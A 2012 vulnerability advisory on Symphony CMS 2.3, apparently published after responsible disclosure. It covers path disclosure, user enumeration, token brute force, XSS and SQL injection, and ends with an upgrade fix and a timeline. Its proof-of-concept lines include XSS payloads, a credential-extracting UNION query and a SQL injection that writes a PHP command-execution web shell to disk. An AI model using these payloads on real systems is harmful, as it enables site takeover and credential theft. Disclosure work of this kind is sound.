@@ -1,0 +1,99 @@
+Symphony cms 2.3 multiple vulnerabilities
+
+--------------------------------------------------------------------------------------------
+20121017 - Justanotherhacker.com : Symphony cms - Multiple vulnerabilities
+JAHx122 - http://www.justanotherhacker.com/advisories/JAHx122.txt
+--------------------------------------------------------------------------------------------
+
+Symphony is an XSLT-powered open source content management system.
+[ Taken from: http://getsymphony.com/ ]
+
+
+--- Vulnerability description ---
+Symphony-cms version 2.3 is vulnerable to several vulnerabilities ranging in
+severity from low to high and can result in complete compromise by an
+unauthenticated attacker.
+
+Discovered by: Eldar "Wireghoul" Marcussen
+Type: Multiple
+Severity: High
+Release: Responsible
+Vendor: Symphony - http://getsymphony.com
+Affected versions: 2.3 (and possibly earlier)
+
+--- Local patch disclosure ---
+Direct requests to library files will disclose the full local file path if php is configured
+to display errors due to the reliance on the library path being declared in a constant 
+of global scope outside of the library script.
+
+PoC:
+http://host/path/symphony/lib/boot/bundle.php
+
+--- User enumeration ---
+The retrive password url http://host/path/symphony/login/retrieve-password/ will display a 
+helpful error message if the email address entered does not exist in the database.
+
+--- Authentication token brute force ---
+Symphony-cms allows a user to login without entering their username and password via
+a remote auth url that contains a token made up of the first 8 characters of a sha1 hash
+of the user's username and hashed password.
+
+If a user has auth_token_active set to yes in the sym_authors table an attacker can login to 
+their account by brute forcing a key of [0-9A-F]^8 length.
+
+The url http://host/path/symphony/login/[token]/ ie: http://host/path/symphony/login/a39880be/ 
+for the user "admin" with password "admin".
+
+
+--- Cross site scripting ---
+Reflected:
+The email input field supplied to http://host/path/symphony/login/retrieve-password/ is not 
+sufficiently filtered for malicious characters resulting in reflected cross site scripting.
+
+PoC:
+Submit form with email address:
+"><script>alert(1)</script>
+
+Reflected:
+The email input field supplied to http://host/path/symphony/login/ is not sufficiently 
+filtered for malicious characters resulting in reflected cross site scripting.
+
+PoC:
+username=%22%3E%3C%2Finput%3E%3Cscript%3Ealert%28%27k63ddgb6ra%27%29%3C%2Fscript%3E&password=on
+
+Persistent:
+The "From name" preference setting in Symphony-cms (http://host/path/symphony/system/preferences/) 
+is not sufficiently encoded resulting in persistent cross site scripting.
+
+PoC:
+settings%5Bemail_sendmail%5D%5Bfrom_name%5D=Symphony%22%3E%3Cscript%3Ealert%281%29%3C%2Fscript%3E
+
+--- Blind sql injection ---
+The username field in the authors detail page is not sufficiently filtered when checking
+is the username already exists in the system. Resulting in blind sql injection.
+
+PoC:
+Edit an author's profile, update the username to include a malicious payload, ie:
+username' union select "<?php @system($_REQUEST['cmd']); ?>" FROM sym_authors INTO OUTFILE '/var/www/workspace/haxed.php
+where the path to your outfile is based on the local path disclosure. 
+
+--- SQL Injection ---
+The "page" number supplied when editing blueprints is vulnerable to sql injection.
+
+We can retrieve a users username, hashed password and auth token status with the following PoC:
+http://host/path/symphony/bluePRINTs/pages/edit/0%29+union+select+1,2,username,password,5,auth_token_active,7,8,9+from+sym_authors+where+id+=+1+--+/
+
+--- Unrestricted file upload ---
+While this appears to be intended functionality for authorised users, combined 
+with the aforementioned vulnerabilities it becomes trivial to place a backdoor
+on the system.
+
+--- Solution ---
+Upgrade to version 2.3.1.
+
+--- Disclosure time line ---
+17-Oct-2012 - Public disclosure
+03-Oct-2012 - Issues patched in upcoming release
+18-Sep-2012 - Patch checked into git
+17-Sep-2012 - Vendor response
+14-Sep-2012 - Vendor notified through email
